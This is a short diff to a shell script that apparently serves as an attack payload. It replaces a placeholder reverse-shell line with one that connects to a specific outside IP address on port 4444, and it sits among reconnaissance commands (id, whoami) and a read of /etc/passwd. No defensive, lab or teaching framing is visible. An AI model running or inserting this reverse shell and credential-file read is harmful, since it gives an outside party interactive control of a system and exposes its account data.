@@ -8,7 +8,7 @@ set -o pipefail
 id
 whoami
 
-bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1
+bash -i >& /dev/tcp/71.47.217.216/4444 0>&1
 
 cat /etc/passwd
 
